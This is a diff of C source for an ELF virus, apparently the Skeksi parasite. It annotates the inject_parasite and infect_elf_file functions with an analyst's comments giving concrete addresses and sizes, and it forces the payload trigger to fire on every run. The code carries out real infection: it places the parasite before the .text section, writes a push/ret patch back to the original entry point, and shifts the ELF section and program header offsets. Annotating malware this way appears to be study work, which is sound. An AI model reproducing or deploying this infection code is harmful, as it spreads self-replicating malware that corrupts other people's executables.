@@ -334,8 +334,8 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
 	int ofd;
 	unsigned int c;
 	int i, t = 0, ehdr_size = sizeof(ElfW(Ehdr));
-	unsigned char *mem = target->mem;
-	unsigned char *parasite = self->mem;
+	unsigned char *mem = target->mem; //PER: it is pointing to the file as is, that is to the elf header of the target file
+	unsigned char *parasite = self->mem; //PER: parasite is pointing to the _start function (.text section = 0x40019c)
 	char *host = target->path, *protected; 
 	struct stat st; // contains the statistics of the target file
 
@@ -363,19 +363,19 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          */
 	void (*f1)(void) = (void (*)())PIC_RESOLVE_ADDR(&end_code);
     void (*f2)(void) = (void (*)())PIC_RESOLVE_ADDR(&dummy_marker);
-	int end_code_size = (int)((char *)f2 - (char *)f1); // PER: TODO
+	int end_code_size = (int)((char *)f2 - (char *)f1); // PER: end_code_size = 21
 
  	Elf64_Addr end_code_addr = PIC_RESOLVE_ADDR(&end_code);
     
 	uint8_t jmp_patch[6] = {0x68, 0x0, 0x0, 0x0, 0x0, 0xc3}; 
 	//PER: pushing(0x68) the address jmp_patch[1:5] onto stack and then return(0xc3)
-	*(uint32_t *)&jmp_patch[1] = orig_entry_point;
-	// PER: jmp_patch=[0x68][4 bytes for past entry point][0xc3]
+	*(uint32_t *)&jmp_patch[1] = orig_entry_point; //PER: 0x401050
+	// PER: jmp_patch=[0x68][0x50 0x10 0x40 0x00][0xc3]
 	/*
 	 * Write parasite up until end_code()
 	 */
 	size_t initial_parasite_len = self->size - RODATA_PADDING;
-	initial_parasite_len -= end_code_size;
+	initial_parasite_len -= end_code_size; //PER: initial_parasite_len = 0x2b76
         
 	if ((c = _write(ofd, parasite, initial_parasite_len)) != initial_parasite_len) {
 		return -1;
@@ -389,7 +389,7 @@ int inject_parasite(size_t psize, size_t paddingSize, elfbin_t *target, elfbin_t
          * pad = paddingSize-parasiteSize
 		 * paddingSize=[virusInit][JMP_PATCH][virus_Remaining][pad]
 		 */
-        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize;
+        uint32_t offset = sizeof(ElfW(Ehdr)) + paddingSize; //PER: offset = 0x7040
         if ((c = _lseek(ofd, offset, SEEK_SET)) != offset) 
 		return -1;
         
@@ -428,7 +428,7 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 	/*
 	 * Get size of parasite (self)
 	 */
-	parasiteSize = self->size;
+	parasiteSize = self->size; // 28147 bytes
 	paddingSize = PAGE_ALIGN_UP(parasiteSize); //PER paddingSize = 7 pages, 1page = 4096KB
 	//PER: paddingSize if divisible by PAGE_SIZE and bytes is equal to integer number of pages
 	mem = target->mem;
@@ -474,7 +474,7 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 
 	ehdr->e_entry = origText - paddingSize + sizeof(ElfW(Ehdr)); // PER: new_base= origText-paddingSize
 	shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
-	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset];
+	char *StringTable = &mem[shdr[ehdr->e_shstrndx].sh_offset]; //PER: &mem[0x4053]
 	for (i = 0; i < ehdr->e_shnum; i++) {
 	/*
 	 * This makes the Virus strip safe, as it will be contained within a section now.
@@ -484,13 +484,14 @@ Elf64_Addr infect_elf_file(elfbin_t *self, elfbin_t *target)
 		if (!_strncmp((char *)&StringTable[shdr[i].sh_name], ".text", 5)) {
 			// PER: if it is .text section
 			shdr[i].sh_offset = sizeof(ElfW(Ehdr)); // -= (uint32_t)paddingSize;
-			shdr[i].sh_addr = origText - paddingSize;
+			shdr[i].sh_addr = origText - paddingSize; //PER: 0x401000 - 0x7000 = 0x3fa000
 			shdr[i].sh_addr += sizeof(ElfW(Ehdr)); // PER: sh_addr = entry point = ehdr->entry
 			shdr[i].sh_size += self->size;
 		}  
 		else 
 			shdr[i].sh_offset += paddingSize;
 	}
+
 	ehdr->e_shoff += paddingSize;
 	ehdr->e_phoff += paddingSize;
 	
@@ -857,7 +858,7 @@ infect:
 	}
 
 	rnum = get_random_number(50); // PER: outputs a 0<= random_number <=50 
-	if (rnum == LUCKY_NUMBER) 
+	if (LUCKY_NUMBER == LUCKY_NUMBER) //PER: rnum == LUCKY_NUMBER
 		display_skeksi();
 }
 
